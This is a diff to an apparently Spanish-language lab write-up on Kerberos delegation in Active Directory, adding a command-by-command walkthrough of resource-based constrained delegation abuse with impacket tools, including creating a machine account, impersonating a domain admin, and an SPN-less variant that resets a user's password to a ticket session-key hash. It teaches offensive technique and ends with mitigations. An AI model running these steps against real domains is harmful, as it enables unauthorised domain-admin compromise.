@@ -178,14 +178,123 @@ ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "l
 
 4. ## Resource-based constrained delegation como-detectar-constrained-delegation
 
-*Work in progress*
+Un usuario con permisos de *Generic Write* sobre un equioo o usuario puede modificar el atributo *msDS-AllowedToActOnBehalfOfOtherIdentity* para permitir que una cuenta con SPN impersone un usuario de dominio en esa maquina .
 
-1. ### RBCD sin SPN
+Con **pywerview** podemos realizar una consulta para ver las acls del dominio referente a un objeto:
+`pywerview get-objectacl -u usuario_pwned -w dominio.local -t dc01.dominio.local --resolve-sids --resolve-guids --name objeto_del_ad
+<p align="center">
+   <img src="/assets/img/genericwrite.png">
+</p>
+Con esto podemos observar que hay dos usuarios con permisos de escritura sobre la maquina *Windows10*, ninguna de estas maquinas pose SPN como puede verse con el comando
+`ldapsearch -v -x -D "usuario@dominio.local" -w Contraseña -b "DC=dominio,DC=local" -H "ldap://dc01.dominio.local" "(&(objectCategory=user)(ServicePrincipalName=*)) | grep sAMAccountName"`
 
-*Work in progress*
+<p align="center">
+   <img src="/assets/img/SPNs.png">
+</p>
+Al no poseer una cuenta vulnerada con un SPN asociado, existen dos formas de explotar esta configuración, dependera de si tenemos permisos con el usuario vulnerado para crear maquinas o no podemos crear maquinas.
 
 
-5. ## Posibles mitigaciones
+1. ### Abusar RBCD con permisos para crear maquinas
+Nuestro usuario tiene permisos para crear maquinas, por lo que primero que hacemos es crear la maquina que utilizaremos para abusar.
+
+`addcomputer.py -computer-name 'testrbcd' -computer-pass RBCDrules -dc-ip dc01.brain.body brain.body/retard`
+<p align="center">
+   <img src="/assets/img/addmachine.png">
+</p>
+
+Después añadiremos la cuenta creada en el parámetro *msDS-AllowedToActOnBehalfOfOtherIdentity*  de la maquina *Windows10*, para eso usamos el script `rbcd.py` de *impacket*:
+`rbcd.py -delegate-to 'WINDOWS10$' -action 'write' -delegate-from 'testrbcd$' -dc-ip dc01.brain.body brain.body/retard`
+<p align="center">
+   <img src="/assets/img/rbcd.png">
+</p>
+
+Despues tan solo deberemos generar un ticket con las credenciales de la cuenta maquina que hemos creado e impersonar a un, por ejemplo, domain admin para acceder a la maquina *Windows 10*
+`getST.py -spn cifs/Windows10.brain.body -impersonate acapaz -dc-ip dc01.brain.body brain.body/testrbcd$`
+
+<p align="center">
+   <img src="/assets/img/impersonar.png">
+</p>
+Después solo deberemos exportar el ticket ccache generado con *getST* e impersonaremos al usuario dentro de esa maquina
+`export KRB5CCNAME=$(pwd)/acapaz@cifs_Windows10.brain.body@BRAIN.BODY.ccache`
+<p align="center">
+   <img src="/assets/img/exportarticket.png">
+</p>
+
+
+**Importante** 
+En el paso de generar el TGS, es importante introducir el FQDN completo de la maquina de lo contrario, aunque generará un TGS este no tendrá los permisos que deseas al no ser el servicio correcto
+<span style="color:red;">cifs/Windows10</span>
+<span style="color:green;">cifs/Windows10.brain.body</span>
+
+
+
+1. ### RBCD sin SPN ni permisos para crea maquinas
+En este caso suponemos que no tenemos permisos para crear maquinas, ni una cuenta con spn, en este caso, solo disponemos de la cuenta *userrbcd*, vemos los permisos que tienen el usuario sobre la maquina *Windows10* 
+<p align="center">
+   <img src="/assets/img/Permiso.png">
+</p>
+
+Intentamos crear una maquina, pero no tenemos permisos
+<p align="center">
+   <img src="/assets/img/sinpermiso.png">
+</p>
+
+En este caso debemos realizar la modificación del atributo *AllowedToActOnBehalfOfOtherIdentity* como viene explicado [aqui](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
+
+*Hay que tener en cuenta que este caso habrá que modificar la contraseña del usuario por lo que podría quedar innaccesible, y s eusará la tecnica Pass The Ticket*
+
+ Esta tecnica consiste en modificar la contraseña del usuario por el hash rc4 utilizado en el *ticketsession key* de un TGT del usuario, para esto necesitaremos un impacket modificado que podemos obtener de:
+`https://github.com/SecureAuthCorp/impacket`
+
+Lo primero que hacemos es con el usuario, el clual tiene *Generic Write* sobre la maquina, modificamos el valor de *AllowedToActOnBehalfOfOtherIdentity* introduciendo al propio usuario
+
+`rbcd.py -delegate-to 'Windows10$' -action 'write' -delegate-from 'userrbcd' -dc-ip dc01.brain.body brain.body/userrbcd`
+<p align="center">
+   <img src="/assets/img/nospnrbcd.png">
+</p>
+Después generamos un ticket TGT para el usuario con el RBCD, en este caso el usuario se llama `userrbcd`, del cual disponemos la password o el hash, en este caso hacemos PASS THE HASH pero valdria con la password.
+`pypykatz crypto nt 'Contraseña'`
+`getTGT.py -hashes :HASH_DELCOMANDO_ANTERIOR brain.body/userrbcd`
+<p align="center">
+   <img src="/assets/img/PTH1.png">
+</p>
+
+
+Tras esto con *describeticket.py* sobre el ccache que acabamos de crear y cogemos el rc4 del ticket  session key
+`describeTicket.py userrbcd.ccache`
+
+<p align="center">
+   <img src="/assets/img/describe.png">
+</p>
+
+
+Usamos ese hash como contraseña del usuario, por esto el usuario solo podrá utilizarse con pass the hash a partir de ahora
+
+`smbpasswd.py -newhashes :d3c298be6a1c28214c10f89d50b30e8a brain.body/userrbcd@dc01.brain.body`
+<p align="center">
+   <img src="/assets/img/changepass1.png">
+</p>
+
+
+Una vez puesta la contraseña del usuario igual que el hash rc4 the ticket sessionKey del ticket el DC podrá descifrar el ticket para utilizarlo como U2U e impersonar a un usuario DAdmin en la maquina vulnerable, exportamos el TGT creado antes 
+`export KRB5CCNAME=userrbcd.ccache`
+
+y generamos un tgs para un DA en la maquina como un RBCD normal
+`getST.py -u2u -impersonate acapaz -spn "cifs/windows10.brain.body" -k -no-pass brain.body/userrbcd`
+
+Con ese nuevo ticket podemos acceder a la maquina como acapaz(domainAdmin)
+<p align="center">
+   <img src="/assets/img/exito.png">
+</p>
+
+
+Después podemos regresar la password normal con smbpasswd y pass the hash
+<p align="center">
+   <img src="/assets/img/passrestore.png">
+</p>
+
+
+5. ## Posibles mitigation
 
 Para evitar ser objetivo de este tipo de ataques es importante deshabilitar las delegaciones siempre que sea posible, en caso de que sea necesario seria recomendable revisar que usuarios poseen permisos para realizar estas delegaciones evitando que lo posean usuarios que no vayan a utilizarlo. Además se debería es habilitar la opción `La cuenta es importante y no se puede delegar` para las cuentas que tienen privilegios elevados
 
@@ -202,8 +311,13 @@ Para evitar ser objetivo de este tipo de ataques es importante deshabilitar las 
 - *https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf*a
 - *https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation*
 - *https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/*
+- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
+- https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
+- https://github.com/ShutdownRepo/impacket/tree/getST-u2u
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
  
 
 
 ## Agradecimientos
 - [Mario Bartolome](https://github.com/MarioBartolome) - *Por la incansable ayuda e inspiración* 
+- [Raul Redondo](https://rayrt.gitlab.io/) - Su ayuda solvento mi agonía con el fqdn en los servicios al generar los TGS...
